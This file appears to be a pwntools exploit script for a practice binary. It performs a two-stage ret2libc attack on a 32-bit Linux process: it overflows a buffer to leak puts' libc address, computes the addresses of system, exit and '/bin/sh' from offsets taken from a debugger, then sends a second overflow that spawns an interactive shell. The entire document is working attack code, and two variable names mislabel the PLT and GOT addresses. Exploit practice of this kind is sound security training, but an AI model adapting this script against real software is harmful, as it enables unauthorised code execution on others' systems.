#!/usr/bin/env python3

from pwn import *

context.update(arch='i386', os='linux')


#gdb-peda$ p puts
#$1 = {<text variable, no debug info>} 0x8049050 <puts@plt>
#gdb-peda$ p main
#$2 = {<text variable, no debug info>} 0x80491a8 <main>
#gdb-peda$ disassemble puts
#Dump of assembler code for function puts@plt:
#   0x08049050 <+0>:     jmp    DWORD PTR ds:0x804c008
#   0x08049056 <+6>:     push   0x10
#   0x0804905b <+11>:    jmp    0x8049020
#End of assembler dump.

p = process("./vuln-32") 
p.recvuntil("desert:")

###############################################################
# ret2libc payload
# WE can cause an overflow with 140 bytes + EIP 
payload = b'A'*140

puts_addr = 0x08049050
puts_plt  = 0x0804c008
main_addr = 0x080491a8

payload +=  p32(puts_addr)
payload +=  p32(main_addr)
payload +=  p32(puts_plt)

p.sendline(payload)

#############################################################
# Following an example of leaking address when ASLR is active
p.recvline()
leak = u32(p.recvline()[:4]) 
log.info('puts@libc is at: {}'.format(hex(leak))) # The leaked value is printed.


#gdb-peda$ p system
#$1 = {<text variable, no debug info>} 0xf7c4c800 <system>
#gdb-peda$ p exit
#$2 = {<text variable, no debug info>} 0xf7c3bc90 <exit>
#gdb-peda$ find "/bin/sh"
#Searching for '/bin/sh' in: None ranges
#Found 1 results, display max 1 items:
#libc.so.6 : 0xf7db5faa ("/bin/sh")
#gdb-peda$ p puts
#$3 = {<text variable, no debug info>} 0xf7c74db0 <puts>

system_offset = 0xf7c74db0 - 0xf7c4c800 
exit_offset = 0xf7c74db0 - 0xf7c3bc90
binsh_offset = 0xf7db5faa - 0xf7c74db0 

system_addr = leak - system_offset
exit_addr = leak - exit_offset
binsh_addr = leak + binsh_offset

log.info('system@libc is at: {}'.format(hex(system_addr)))
log.info('exit@libc is at: {}'.format(hex(exit_addr)))
log.info('binsh@libc is at: {}'.format(hex(binsh_addr)))

payload = b'A'*140
payload += p32(system_addr)
payload += p32(exit_addr)
payload += p32(binsh_addr)

log.info('Re-exploiting the main().')

p.recvuntil('desert:')
p.sendline(payload)
p.interactive()

